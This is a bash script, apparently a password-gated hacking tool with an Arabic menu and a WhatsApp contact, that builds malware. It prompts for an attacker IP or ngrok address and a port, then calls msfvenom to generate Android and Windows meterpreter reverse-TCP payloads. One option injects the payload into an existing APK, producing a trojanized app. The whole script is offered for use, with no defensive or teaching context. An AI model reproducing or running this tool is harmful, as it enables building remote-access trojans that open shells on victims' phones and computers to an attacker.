#!/bin/bash

logb(){
echo """

~Y55?.
            !B@@B~
             .J&@&5:
               ^P@@#?
                 !#@@G^
                  :#@@&~
                 !#@@G^
               ^P@@#?
             .J&@&5:
            !B@@B~        7PPPPPPPPPPP5
           ~Y55?.         755555555555Y


whatsapp: https://wa.me/+201024132476


"""



}

banner(){

echo """

                                 :77:
                               .7?7?~
                              ~?7?7.
                            :?77?:
        .~7^              .7?7?~     .~7~.
      :!?7?7.            ~?7?7.      :??7?~.
    ^7?7?!:            :7???^          ^!?7?!:
  ^7?7?~.            .7?7?~.             :!?7?7^
  ~?77?~            ~?7?7.                ~?77?~
    ~?77?~.       :?77?:               .!?7?7^
      ^7?7?!.   .!?7?~               .!?7?!:
        :77!.  ~?7?7.                :!7!:
          .  :?77?^                    .
             ??J~
              ..



   .....
   .:^^..::^::.::::::: ::^^^^^^::.::. ::..:::::.
    ::: .^:::: ^::::::.^:..::..:^.^^. :^: .:^^:
    .::  ::^::.::::^^. ::..::..:^ ::::^:..:::::.
           .                        ...

whatsapp: https://wa.me/+201024132476



"""


}


ppass(){
logb
read -p "Enter Password>> " pas
echo ""
if [ $pas == 'Rv333' ]
then
main
else
exit
fi
}

main(){
banner
echo "[1]بايلود اندرويد"
echo "[2]بايلود ويندوز"
echo "[3]حقن بايلود اندرويد في تطبيق"
echo "[4]حقن بايلود ويندوز في تطبيق"
echo ""
echo "قريبااااا"
echo ""
echo ""
echo ""
read -p ">>> " i
if [ $i == '1' ]
then
echo """



"""

read -p " ضع عنوان اي بي او نجروك >>" lh
read -p " ضع البورت>> " lp
echo """


مثال
/sdcard/name.apk

linux
/Desktop/name.apk

"""
read -p " ضع مسار واسم بايلود>> " o


msfvenom -p android/meterpreter/reverse_tcp lhost=$lh lport=$lp -o $o



elif [ $i == '2' ]
then

echo """



"""

read -p " ضع عنوان اي بي او نجروك >>" lh
read -p " ضع البورت>> " lp
echo """


مثال
/sdcard/name.apk

linux
/Desktop/name.apk

"""
read -p " ضع مسار واسم بايلود>> " o

msfvenom -p windows/meterpreter/reverse_tcp lhost=$lh lport=$lp -o $o


elif [ $i == '3' ]
then

echo """



"""
echo """

مثال
/sdcard/Download/app.apk


"""
read -p " مسار التطبيق المراد حقنه>> " a
read -p " ضع عنوان اي بي او نجروك >>" lh
read -p " ضع البورت>> " lp
echo """


مثال
/sdcard/name.apk

linux
/Desktop/name.apk

"""
read -p " ضع مسار واسم بايلود>> " o


msfvenom -x $a -p android/meterpreter/reverse_tcp lhost=$lh lport=$lp -o $o




else
clear
main





fi
}






ppass
